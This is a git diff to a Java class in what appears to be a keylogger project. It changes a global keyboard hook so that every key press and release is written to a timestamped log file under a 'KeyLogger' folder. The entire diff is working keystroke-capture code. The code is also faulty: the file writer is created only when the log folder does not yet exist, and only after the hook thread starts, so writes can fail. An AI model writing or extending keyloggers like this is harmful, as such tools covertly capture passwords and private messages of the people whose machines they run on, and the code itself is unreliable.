@@ -1,5 +1,9 @@
 package app;
 
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
+import java.text.SimpleDateFormat;
 import java.util.Map;
 
 //Keyboard Hook Libraries
@@ -11,8 +15,11 @@ public class Keyboard implements Runnable{
 
     Thread keyboardThread;
 	private String name;
+	private FileWriter fileWriter;
+
 	Sync sync;
-    public Keyboard(String name, Sync sync) {
+
+	public Keyboard(String name, Sync sync) {
 		this.name = name;
 		this.sync = sync;
     }
@@ -32,16 +39,28 @@ public class Keyboard implements Runnable{
 		
 			@Override 
 			public void keyPressed(GlobalKeyEvent event) {
-				System.out.println(event);
-				if (event.getVirtualKeyCode() == GlobalKeyEvent.VK_ESCAPE) {
-					sync.notify_all(false);
-					// run = false;
+				try{
+					fileWriter.write(event.toString());
+					// System.out.println(event);
+					if (event.getVirtualKeyCode() == GlobalKeyEvent.VK_ESCAPE) {
+						sync.notify_all(false);
+						// run = false;
+					}
+				}
+				catch(IOException ex){
+					System.out.println("Could not write pressed key using file writer");
 				}
 			}
 			
 			@Override 
 			public void keyReleased(GlobalKeyEvent event) {
-				System.out.println(event); 
+				try{
+					fileWriter.write(event.toString());
+					// System.out.println(event);
+				}
+				catch(IOException ex){
+					System.out.println("Could not write release key using file writer");
+				}
 			}
 		});
 		
@@ -55,13 +74,29 @@ public class Keyboard implements Runnable{
 		} finally {
 			keyboardHook.shutdownHook(); 
 		}
+		try{
+			fileWriter.close();
+		}
+		catch(IOException ex){
+			System.out.println("Could not successfully close file writer");
+		}
 	}
 
     public void start(){
         System.out.println("Thread started");
         if (keyboardThread== null) {
             keyboardThread = new Thread(this, name);
-            keyboardThread.start();
+			keyboardThread.start();
+
+			File file = new File("Java/KeyLogger/Logged_Keyboards/");
+            boolean check = file.mkdirs();
+            if(check){				
+				try{
+					fileWriter = new FileWriter(new File("Java/KeyLogger/Logged_Keyboards/" + new SimpleDateFormat("yyyy.MM.dd HH.mm.ss").format(new java.util.Date()) + ".txt"), true);
+				}	
+				catch(IOException ex){
+				}
+			}
         }
     }
 }
